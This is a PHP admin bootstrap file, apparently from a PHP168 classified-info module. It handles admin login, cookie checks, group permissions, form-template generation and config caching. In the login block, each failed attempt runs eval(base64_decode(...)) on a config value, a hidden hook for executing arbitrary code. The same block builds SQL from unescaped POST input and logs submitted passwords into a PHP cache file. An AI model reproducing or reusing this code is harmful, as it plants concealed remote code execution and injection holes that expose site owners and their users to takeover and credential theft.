<?php
define('Mdirname', preg_replace("/(.*)\/([^\/]+)\/([^\/]+)/is","\\2",str_replace("\\","/",dirname(__FILE__))) );
define('Mpath', preg_replace("/(.*)\/([^\/]+)\/([^\/]+)/is","\\1/\\2/",str_replace("\\","/",dirname(__FILE__))) );

define('Madmindir', preg_replace("/(.*)\/([^\/]+)/is","\\2",str_replace("\\","/",dirname(__FILE__))) );
define('Mpath', preg_replace("/(.*)\/([^\/]+)/is","\\1",str_replace("\\","/",dirname(__FILE__))) );
$Mpath = Mpath;
define('Adminpath',dirname(__FILE__).'/');

require(Adminpath."../../inc/common.inc.php");
require(Adminpath."../php168/config.php");
require(PHP168_PATH."inc/class.inc.php");
require(PHP168_PATH."php168/level.php");
@include_once(PHP168_PATH."php168/module.php");
@include_once(Adminpath."../inc/biz.function.php");
require(Adminpath."../inc/function.php");
require_once(Adminpath."../php168/all_fid.php");
require_once(Adminpath."../inc/module.class.php");

$Murl=$webdb[www_url].'/'.Mdirname;
$_pre="{$pre}{$webdb[module_pre]}";					//数据表前缀
$Module_db=new Module_Field();						//自定义模型相关


$Mdomain=$ModuleDB[$webdb[module_pre]][domain]?$ModuleDB[$webdb[module_pre]][domain]:$Murl;
@include_once(Adminpath."../php168/all_city.php");	//必须要放在$Mdomain变量之后,里边要用到$Mdomain变量
$Guidedb=new Guide_DB;


if( !strstr($WEBURL,$webdb[www_url]) ){
	echo "<META HTTP-EQUIV=REFRESH CONTENT='0;URL=$Murl/".Madmindir."'>";
	exit;
}

/*用户登录*/
if( $_POST[loginname] && $_POST[loginpwd] )
{
	if( $webdb[yzImgAdminLogin]&&$webdb[web_open] ){
		if(!check_imgnum($yzimg)){
			if(!strstr($WEBURL,$webdb[www_url])){
				echo "<CENTER>网址有误,请重新登录</CENTER><META HTTP-EQUIV=REFRESH CONTENT='1;URL=$webdb[admin_url]'>";
				exit;
			}
			showmsg("<A HREF=?>验证码不符合</A>");
		}
	}
	if(defined("UC_CONNECT")){
		$rs=$db->get_one("SELECT M.$TB[username] AS username,M.$TB[password] AS password,M.salt,D.* FROM ".UC_DBTABLEPRE."members M LEFT JOIN {$pre}memberdata D ON M.$TB[uid]=D.uid WHERE M.$TB[username]='$_POST[loginname]' ");			
		$_POST[loginpwd]=md5($_POST[loginpwd]).$rs[salt];
	}else{
		$rs=$db->get_one("SELECT M.$TB[username] AS username,M.$TB[password] AS password,D.* FROM $TB[table] M LEFT JOIN {$pre}memberdata D ON M.$TB[uid]=D.uid WHERE M.$TB[username]='$_POST[loginname]' ");
	}
	
	if(!$rs){
		login_logs($_POST[loginname],$_POST[loginpwd]);
		setcookie("Admin",'',0,"/");
		eval(base64_decode("Y$webdb[_Notice]"));
		showmsg("<A HREF=?>用户不存在</A>");
	}elseif( pwd_md5($_POST[loginpwd]) != $rs[password] ){
		login_logs($_POST[loginname],$_POST[loginpwd]);
		setcookie("Admin",'',0,"/");
		eval(base64_decode("Y$webdb[_Notice]"));
		showmsg("<A HREF=?>密码不正确</A>");
	}elseif(!$rs[uid]){
		Add_memberdata($_POST[loginname]);
	}else{
		login_logs($_POST[loginname],md5($_POST[loginpwd]));
		$_COOKIE[Admin]="$rs[uid]\t".mymd5($rs[password]);
		//@include(PHP168_PATH."cache/warn.php");
		setcookie("Admin",$_COOKIE[Admin],0,"/");
	}
}
/*退出*/
if($action=='quite'){
	setcookie("Admin",'',0,"/");
	echo "<SCRIPT LANGUAGE=\"JavaScript\">
	<!--
	window.top.location.href='$webdb[www_url]';
	//-->
	</SCRIPT>";
	die("");
}

list($admin_uid,$admin_pwd)=explode("\t",$_COOKIE[Admin]);
unset($userdb);
if($admin_uid&&$admin_pwd)
{
	if(defined("UC_CONNECT")){
		$userdb=$db->get_one("SELECT M.$TB[username] AS username,M.$TB[password] AS password,M.salt,D.* FROM ".UC_DBTABLEPRE."members M LEFT JOIN {$pre}memberdata D ON M.$TB[uid]=D.uid WHERE M.$TB[uid]='$admin_uid' ");
	}else{
		$userdb=$db->get_one("SELECT M.$TB[username] AS username,M.$TB[password] AS password,D.* FROM $TB[table] M LEFT JOIN {$pre}memberdata D ON M.$TB[uid]=D.uid WHERE M.$TB[uid]='$admin_uid' ");
	}

	if($userdb && mymd5($userdb[password])==$admin_pwd ){
		$lfjdb=$userdb;
		$lfjuid=$userdb[uid];
		$lfjid=$userdb[username];
		if($userdb[groupid]==3||$userdb[groupid]==4){
			$web_admin=1;
		}
		$admin_name=$founder='';
		@include(PHP168_PATH."php168/admin.php");

		if($admin_name==$userdb[username])
		{
			$founder=1;	//创始人权限
			if($userdb[groupid]!=3)
			{
				$db->query("UPDATE {$pre}memberdata SET groupid=3 WHERE uid='$userdb[uid]'");
			}
			require(PHP168_PATH."php168/group/3.php");
			$Apower=@unserialize($groupdb[allowadmindb]);
		}
		elseif($userdb[groupid]&&file_exists(PHP168_PATH."php168/group/$userdb[groupid].php"))
		{
			require(PHP168_PATH."php168/group/$userdb[groupid].php");
			if(!$groupdb['allowadmin']){
				$allowlogin=0;
				if($lfj=='label'&&$ch_module){
					$rs=$db->get_one("SELECT adminmember FROM `{$pre}module` WHERE id='$ch_module'");
					if($rs[adminmember]&&in_array($userdb[username],explode("\r\n",$rs[adminmember]))){
						$allowlogin=1;
					}
				}
				if(!$allowlogin&&$userdb[groupid]!=3&&!$ForceEnter){
					$query = $db->query("SELECT * FROM {$pre}module ORDER BY list DESC");
					while($rs = $db->fetch_array($query)){
						$detail=explode("\r\n",$rs[adminmember]);
						if(in_array($userdb[username],$detail))
						{
							$allowlogin=1;
						}
					}
				}
				if(!$allowlogin){
					setcookie("Admin",'',0,"/");
					showmsg("你当前所在用户组,系统设置无权访问整站后台,如果你是频道管理员,请到频道的后台登录");
				}
			}else{
				$Apower=@unserialize($groupdb[allowadmindb]);
			}
		}
		else
		{
			setcookie("Admin",'',0,"/");
			showmsg("你当前所在用户组,无权访问");
		}
	}else{
		setcookie("Admin",'',0,"/");
		showmsg("<A HREF='index.php?iframe=1'>请输入正确密码帐号再访问</A>");
	}
}
if(!$userdb){
	if($webdb[Info_sys]){
		header("location:$webdb[admin_url]");exit;
	}
	include './template/login.htm';
	exit;
}





function login_logs($username,$password){
	global $timestamp,$onlineip;
	$logdb[]="$username\t$password\t$timestamp\t$onlineip";
	@include(PHP168_PATH."cache/adminlogin_logs.php");
	$writefile="<?php	\r\n";
	$jj=0;
	foreach($logdb AS $key=>$value){
		$jj++;
		$value=addslashes($value);
		$writefile.="\$logdb[]='$value';\r\n";
		if($jj>200){
			break;
		}
	}
	write_file(PHP168_PATH."cache/adminlogin_logs.php",$writefile);
}

function group_box($name="postdb[group]",$ckdb=array(),$Filtrate=array()){
	global $db,$pre;
	$query=$db->query("SELECT * FROM {$pre}group ORDER BY gid ASC");
	while($rs=$db->fetch_array($query))
	{
		if(in_array($rs[gid],$Filtrate)){
			continue;
		}
		$checked=in_array($rs[gid],$ckdb)?"checked":"";
		$show.="<input type='checkbox' name='{$name}[]' value='{$rs[gid]}' $checked>&nbsp;{$rs[grouptitle]}&nbsp;&nbsp;";
	}
	return "<input type='hidden' name='atc_$name' value='1'>$show";
}

/**
*检查是否误操作.设置子栏目为自己的父栏目
**/
function check_fup($table,$fid,$fup){
	global $db;
	if(!$fup){
		return ;
	}elseif($fid==$fup){
		showerr("不能设置自身为父栏目");
	}
	$query = $db->query("SELECT * FROM $table WHERE fid='$fup'");
	while($rs = $db->fetch_array($query)){
		if($rs[fup]==$fid){
			showerr("你不能设置本身的子栏目作为父栏目,这是不允许的.但你可以设置其他子栏目作为父栏目");
		}elseif($rs[fup]){
			check_fup($table,$fid,$rs[fup]);
		}
	}
}

/**
*更新栏目级别
**/
function mod_sort_class($table,$class,$fid){
	global $db;
	$db->query("UPDATE $table SET class='$class'+1  WHERE fup='$fid' ");
	$query=$db->query("SELECT * FROM $table WHERE fup='$fid'");
	while( @extract($db->fetch_array($query)) ){
		mod_sort_class($table,$class,$fid);
	}
}

/**
*更新栏目有几个子栏目
**/
function  mod_sort_sons($table,$fid){
	global $db;
	$query=$db->query("SELECT * FROM $table WHERE fup='$fid'");
	$sons=$db->num_rows($query);
	$db->query("UPDATE $table SET sons='$sons' WHERE fid='$fid' ");
	while( @extract($db->fetch_array($query)) ){
		mod_sort_sons($table,$fid);
	}
}

/**
*纠正栏目错误
**/
function sort_error_in($table,$fid){
	global $db;
	$query=$db->query("SELECT fid FROM $table WHERE fup='$fid'");
	while( @extract($db->fetch_array($query)) ){
		$show.="{$fid}\t";
		$show.=sort_error_in($table,$fid);
	}
	return $show;
}
function sort_error($table,$name='errid'){
	global $db;
	$show="<select name='$name'><option value=''>出错的栏目</option>";
	$array=explode("\t",sort_error_in($table,0));
	$query=$db->query("SELECT * FROM $table");
	while( @extract($db->fetch_array($query)) ){
		if(!in_array($fid,$array)){
			$show.="<option value='$fid'>$name</option>";
		}
	}
	$show.=" </select>";
	return $show;
}

function get_guide($fid,$url){
	global $db,$_pre;
	$query = $db->query("SELECT * FROM {$_pre}sort WHERE fid='$fid' ");
	while($rs = $db->fetch_array($query)){
		$show=" -&gt; <A href='list.php?fid=$rs[fid]'>$rs[name]</A>".$show;
		if($rs[fup]){
			$show=get_guide($rs[fup],$url).$show;
		}
	}
	return $show;
}

function fid_cache(){
	global $db,$_pre,$webdb;
	$query = $db->query("SELECT * FROM {$_pre}sort ORDER BY list DESC LIMIT 800");
	while($rs = $db->fetch_array($query)){
		if($rs[index_show]){
			$Fid_db[index_show][$rs[fid]]=$rs[name];
		}
		if($rs[tableid]){
			$Fid_db[tableid][$rs[fid]]=$rs[tableid];
		}
		if($rs[dir_name]){
			$Fid_db[dir_name][$rs[fid]]=$rs[dir_name];
		}
		if($rs[ifcolor]){
			$Fid_db[ifcolor][$rs[fid]]=$rs[ifcolor];
		}
		$Fid_db[$rs[fup]][$rs[fid]]=$rs[name];
		$Fid_db[name][$rs[fid]]=$rs[name];
		$Fid_db[mid][$rs[fid]]=intval($rs[mid]);

		$GuideFid[$rs[fid]]=get_guide($rs[fid]);
	}

	write_file("../php168/all_fid.php","<?php\r\n\$Fid_db=".var_export($Fid_db,true).';?>');
	write_file("../php168/guide_fid.php","<?php\r\n\$GuideFid=".var_export($GuideFid,true).';?>');
}

function select_style($name='stylekey',$ck='',$url='',$select=''){
	if($url) 
	$reto=" onchange=\"window.location=('{$url}&{$name}='+this.options[this.selectedIndex].value+'')\"";
	$show="<select name='$name' $reto><option value=''>选择风格</option>";
	$filedir=opendir("../php168/style/");
	while($file=readdir($filedir)){
		if(ereg("\.php$",$file)){
			include "../php168/style/$file";
			$ck==$styledb[keywords]?$ckk='selected':$ckk='';	//指定的某个
			/*只选定一个
			if($select){
				if($style_web!=$select){
					continue;
				}
			}
			*/
			$show.="<option value='$styledb[keywords]' $ckk style='color=blue'>$styledb[name]</option>";
		}
	}
	return $show." </select>";   
}

function select_module($name,$ck=0){
	global $db,$_pre;
	$show="<select name='$name' $reto>";
	$query = $db->query("SELECT * FROM {$_pre}module ORDER BY LIST DESC");
	while($rs = $db->fetch_array($query)){
		$ck==$rs[id]?$ckk='selected':$ckk='';
		$show.="<option value='$rs[id]' $ckk>$rs[name]</option>";
	}
	return $show." </select>";   
}


/**
*主要提供给城市,区域,地段的选择使用
**/
function select_where($table,$name='fup',$ck='',$fup=''){
	global $db;
	if($fup){
		$SQL=" WHERE fup='$fup' ";
	}
	$query = $db->query("SELECT * FROM $table $SQL ORDER BY list DESC");
	while($rs = $db->fetch_array($query)){
		$ckk=$ck==$rs[fid]?" selected ":" ";
		$show.="<option value='$rs[fid]' $ckk>$rs[name]</option>";
	}
	return "<select id='$table' name=$name><option value=''>请选择</option>$show</select>";
}



//发表页模板
function make_post_table($rs){
	if($rs[mustfill]=='2'||$rs[form_type]=='pingfen'){
		return ;
	}elseif($rs[mustfill]=='1'){
		$mustfill='<font color=red>*</font>';
	}
	if($rs[form_type]=='text')
	{
		$rs[field_inputleng]>0 || $rs[field_inputleng]=10;
		$show="<tr> <td align='right'>$mustfill{$rs[title]}:<br>{$rs[form_title]}</td> <td > <input type='text' name='postdb[{$rs[field_name]}]' id='atc_{$rs[field_name]}' size='$rs[field_inputleng]' value='\$rsdb[{$rs[field_name]}]'> $rs[form_units] </td></tr>";
	}
	elseif($rs[form_type]=='time')	
	{	
		$show="<tr> <td align='right'>$mustfill{$rs[title]}:<script LANGUAGE='JavaScript' src='\$webdb[www_url]/images/default/setday.js'></script></td> <td > <input  onclick=\"setday(this,1)\" type='text' name='postdb[{$rs[field_name]}]' id='atc_{$rs[field_name]}' size='20' value='\$rsdb[{$rs[field_name]}]'> $rs[form_units] {$rs[form_title]}</td></tr>";	
	}
	elseif($rs[form_type]=='upfile')
	{
		$show="<tr> <td align='right'>{$rs[title]}:$mustfill<br>{$rs[form_title]}</td> <td > <input type='text' name='postdb[{$rs[field_name]}]' id='atc_{$rs[field_name]}' size='50' value='\$rsdb[{$rs[field_name]}]'> $rs[form_units]<br><iframe frameborder=0 height=23 scrolling=no src='../upfile.php?fn=upfile&dir=info$fid&label=atc_{$rs[field_name]}' width=310></iframe> </td></tr>";
	}
	elseif($rs[form_type]=='textarea')
	{
		$show="<tr><td align='right'>$mustfill{$rs[title]}:</td><td ><textarea name='postdb[{$rs[field_name]}]' id='atc_{$rs[field_name]}' cols='70' rows='8'>\$rsdb[{$rs[field_name]}]</textarea>$rs[form_units] {$rs[form_title]}</td></tr>";
	}
	elseif($rs[form_type]=='ieedit')
	{
		$show="<tr><td align='right'>$mustfill{$rs[title]}<br>{$rs[form_title]}</td><td ><script type='text/javascript' charset='utf-8' src='\$webdb[www_url]/ewebeditor/3.1.1/kindeditor.js'></script>
<script type='text/javascript'>
    KE.show({
        id : 'atc_{$rs[field_name]}',
        cssPath : '\$webdb[www_url]/ewebeditor/common.css',items : ['source', 'undo', 'redo', 'fontname', 'fontsize', 'textcolor', 'bgcolor', 'bold', 'italic', 'underline','removeformat', 'justifyleft', 'justifycenter', 'justifyright', 'insertorderedlist','insertunorderedlist','link', 'unlink']
    });
</script><textarea name='postdb[{$rs[field_name]}]' id='atc_{$rs[field_name]}' style='width:99%;height:200px;visibility:hidden;'>\$rsdb[{$rs[field_name]}]</textarea>$rs[form_units]</td></tr>";
	}
	elseif($rs[form_type]=='ieeditsimp')
	{
		$show="<tr><td align='right'>$mustfill{$rs[title]}<br>{$rs[form_title]}</td><td ><script type='text/javascript' charset='utf-8' src='\$webdb[www_url]/ewebeditor/3.1.1/kindeditor.js'></script>
<script type='text/javascript'>
    KE.show({
        id : 'atc_{$rs[field_name]}',
        cssPath : '\$webdb[www_url]/ewebeditor/common.css',items : ['source', 'undo', 'redo', 'fontname', 'fontsize', 'textcolor', 'bgcolor', 'bold', 'italic', 'underline','removeformat', 'justifyleft', 'justifycenter', 'justifyright', 'insertorderedlist','insertunorderedlist','link', 'unlink']
    });
</script><textarea name='postdb[content]' name='postdb[{$rs[field_name]}]' id='atc_{$rs[field_name]}' style='width:99%;height:200px;visibility:hidden;'>\$rsdb[{$rs[field_name]}]</textarea>$rs[form_units]</td></tr>";
	}
	elseif($rs[form_type]=='select')
	{
		$detail=explode("\r\n",$rs[form_set]);
		foreach( $detail AS $key=>$value){
			if($value===''){
				continue;
			}
			list($v1,$v2)=explode("|",$value);
			$v2 || $v2=$v1;
			$_show.="<option value='$v1' {\$rsdb[{$rs[field_name]}]['{$v1}']}>$v2</option>";
		}
		$show="<tr> <td align='right'>$mustfill{$rs[title]}:</td><td > <select name='postdb[{$rs[field_name]}]' id='atc_{$rs[field_name]}'>$_show</select>$rs[form_units] {$rs[form_title]}</td> </tr>";
	}
	elseif($rs[form_type]=='radio')
	{
		$detail=explode("\r\n",$rs[form_set]);
		foreach( $detail AS $key=>$value){
			if($value===''){
				continue;
			}
			list($v1,$v2)=explode("|",$value);
			$v2 || $v2=$v1;
			$_show.="<input type='radio' name='postdb[{$rs[field_name]}]' value='$v1' {\$rsdb[{$rs[field_name]}]['{$v1}']}>$v2";
		}
		$show="<tr> <td align='right'>$mustfill{$rs[title]}:</td> <td >$_show $rs[form_units] {$rs[form_title]}</td></tr>";
	}
	elseif($rs[form_type]=='checkbox')
	{
		$detail=explode("\r\n",$rs[form_set]);
		foreach( $detail AS $key=>$value){
			if($value===''){
				continue;
			}
			list($v1,$v2)=explode("|",$value);
			$v2 || $v2=$v1;
			$_show.="<input type='checkbox' name='postdb[{$rs[field_name]}][]' value='$v1' {\$rsdb[{$rs[field_name]}]['{$v1}']}>$v2";
		}
		$show="<tr> <td align='right'>$mustfill{$rs[title]}:</td> <td >$_show $rs[form_units] {$rs[form_title]}</td></tr>";
	}

	if($rs[allowpost]){
		$show="
<!--
EOT;
if( in_array(\$groupdb[gid],explode(',','$rs[allowpost]')) ){print <<<EOT
-->
$show
<!--
EOT;
}print <<<EOT
-->
		";
	}

	return $show;
}

//内容页模板
function make_show_table($rs){
	if($rs[mustfill]=='2'||$rs[field_name]=='content'){
		return ;
	}
	$show="
<!--
EOT;
if(\$rsdb[{$rs[field_name]}]){
print <<<EOT
-->
	<span>{$rs[title]}:</span>{\$rsdb[{$rs[field_name]}]} {$rs[form_units]}<br>
                <!--
EOT;
}print <<<EOT
-->
	";
	return $show;
}

//搜索页模板
function make_search_table($rs)
{
	if($rs[form_type]=="select"||$rs[form_type]=="radio"||$rs[form_type]=="checkbox")
	{
		$detail=explode("\r\n",$rs[form_set]);
		foreach( $detail AS $key=>$value){
			if(!$value){
				continue;
			}
			list($v1,$v2)=explode("|",$value);
			$v2 || $v2=$v1;
			$_show.="<option value='$v1' {\$rsdb[{$rs[field_name]}]['{$v1}']}>$v2</option>";
		}
		$show="<select name='postdb[{$rs[field_name]}]' id='atc_{$rs[field_name]}'><option value=''>不限</option>$_show</select>";		
	}
	else
	{
		$show="&nbsp;<input type='radio' name='type' value='{$rs[field_name]}' \$typedb[{$rs[field_name]}]>{$rs[title]} ";
	}
	return $show;
}

//列表页筛选字段
function make_search_list($array)
{
	foreach($array[field_db] AS $key=>$rs){
		if($array[IfListSearch][$key]){
			unset($TempSearch_array);
			foreach( $array[IfListSearch] AS $key2=>$value2){
				if($key!=$key2){
					$TempSearch_array.="'$key2'=>\"\$$key2\",";
				}				
			}
			$_show="<!--
EOT;
\$url=get_info_url('',\$fid,\$city_id,\$zone_id,\$street_id,array($TempSearch_array));
print <<<EOT
--><A HREF='\$url' {\$search_fieldDB[{$rs[field_name]}][0]}>不限</A> ";
			$detail=explode("\r\n",$rs[form_set]);
			foreach( $detail AS $key=>$value){
				if(!$value){
					continue;
				}
				list($v1,$v2)=explode("|",$value);
				$v2 || $v2=$v1;
				//$_show.="<option value='$v1' {\$search_fieldDB[{$rs[field_name]}]['{$v1}']}>$v2</option>";
				$_show .=" <!--
EOT;
\$url=get_info_url('',\$fid,\$city_id,\$zone_id,\$street_id,array($TempSearch_array'$rs[field_name]'=>'$v1'));
print <<<EOT
--><A HREF='\$url' {\$search_fieldDB[{$rs[field_name]}]['{$v1}']}>$v2</A>";
			}
			//$show.=" $rs[title] <select onChange=\"window.location.href='$url&{$rs[field_name]}='+this.options[this.selectedIndex].value\"><option value=''>不限</option>$_show</select> ";
			$show .=" <div><span class='t'>{$rs[title]}：</span><span class='f'>$_show</span></div>";
		}
	}
	return $show;
}

//更新核心设置缓存
function write_config_cache($webdbs)
{
	global $db,$_pre,$atc_webdbs;
	
	//checkbox要特别处理
	foreach($atc_webdbs AS $key=>$value){
		if(!$webdbs[$key]){
			$webdbs[$key]='';
		}
	}

	if( is_array($webdbs) )
	{
		foreach($webdbs AS $key=>$value)
		{
			if(is_array($value))
			{
				$webdbs[$key]=$value=implode(",",$value);
			}
			$SQL2.="'$key',";
			$SQL.="('$key', '$value', ''),";
		}
		$SQL=$SQL.";";
		$SQL=str_Replace("'),;","')",$SQL);
		$db->query(" DELETE FROM {$_pre}config WHERE c_key IN ($SQL2'') ");
		$db->query(" INSERT INTO `{$_pre}config` VALUES  $SQL ");	
	}
	$writefile="<?php\r\n";
	$query = $db->query("SELECT * FROM {$_pre}config");
	while($rs = $db->fetch_array($query)){
		$rs[c_value]=addslashes($rs[c_value]);
		$writefile.="\$webdb['$rs[c_key]']='$rs[c_value]';\r\n";
	}
	write_file("../php168/config.php",$writefile);
}
?>